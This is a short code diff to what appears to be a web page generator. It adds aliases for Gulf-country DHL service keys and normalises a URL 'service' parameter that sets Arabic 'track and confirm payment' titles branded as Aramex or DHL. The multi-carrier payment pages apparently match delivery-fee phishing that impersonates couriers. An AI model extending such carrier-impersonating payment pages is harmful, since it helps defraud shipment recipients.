@@ -138,6 +138,13 @@
       }
     };
 
+    const serviceAliases = {
+      dhlkw: "dhl",
+      dhlqa: "dhl",
+      dhlom: "dhl",
+      dhlbh: "dhl"
+    };
+
     // Country data mapping
     const countryData = {
       AE: { nameAr: "الإمارات العربية المتحدة", name: "United Arab Emirates" },
@@ -175,8 +182,9 @@
       
       if (type === "shipping") {
         // For shipping, try to get service info from URL parameters or use default
-        const serviceKey = url.searchParams.get('service') || 'aramex';
-        const serviceInfo = serviceData[serviceKey] || serviceData.aramex;
+        const rawServiceKey = (url.searchParams.get('service') || 'aramex').toLowerCase();
+        const canonicalServiceKey = serviceAliases[rawServiceKey] || rawServiceKey;
+        const serviceInfo = serviceData[canonicalServiceKey] || serviceData.aramex;
         
         title = `تتبع وتأكيد الدفع - ${serviceInfo.name}`;
         description = `${serviceInfo.description} - تتبع شحنتك وأكمل الدفع بشكل آمن`;
